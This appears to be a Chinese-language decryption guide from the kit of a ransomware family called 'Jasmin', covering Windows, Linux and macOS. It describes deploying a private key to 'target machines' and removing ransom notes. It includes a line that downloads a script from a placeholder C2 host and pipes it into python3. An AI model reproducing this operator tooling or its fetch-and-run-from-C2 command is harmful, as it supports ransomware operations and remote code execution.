解密教程

🖥️ Windows 解密

GUI方式 (Jasmin Decryptor) 或命令行

1将 jasmin_private.pem 和 Jasmin_Decryptor.exe 复制到目标机
2运行 Decryptor → 点击图标选择 .pem 私钥文件
3验证通过后点击 Decrypt，等待进度条完成
4解密完成自动清除勒索提示文件
SHA-256 完整性校验确保每个文件100%还原

一键解密命令

:: PowerShell 一键解密 (需先将私钥放在C:\key.pem)
powershell -c "Get-ChildItem -Recurse -Filter *.jasmin | ForEach { .\Jasmin_Decryptor.exe C:\key.pem $_.FullName }"

🐧 Linux 解密

使用 jasmin_decrypt.py (Python3 命令行)

1上传 jasmin_private.pem 和 jasmin_decrypt.py 到目标机
2安装依赖: pip3 install cryptography
3运行解密 (自动扫描 /home /root /var /opt /tmp /srv)
4检查输出: [+] 成功 / [-] 失败，失败文件保持 .jasmin 不删
SHA-256 校验确保完整还原

一键解密命令

# 方式1: 全盘解密 (自动扫描默认目录)
pip3 install cryptography && python3 jasmin_decrypt.py jasmin_private.pem

# 方式2: 指定目录解密
python3 jasmin_decrypt.py jasmin_private.pem /home/user /var/www /opt/data

# 方式3: 远程一键解密 (从C2下载脚本)
curl -sL http://YOUR_C2/jasmin_decrypt.py | python3 - jasmin_private.pem

🍎 macOS 解密

与 Linux 相同，使用 jasmin_decrypt.py

1安装: brew install python3 && pip3 install cryptography
2运行解密 (自动扫描 ~/、/Users、/tmp)
3可指定目录: python3 jasmin_decrypt.py key.pem ~/Documents
SHA-256 校验确保完整还原

一键解密命令

# 全盘解密
pip3 install cryptography && python3 jasmin_decrypt.py jasmin_private.pem

# 指定目录
python3 jasmin_decrypt.py jasmin_private.pem ~/Documents /Users/Shared
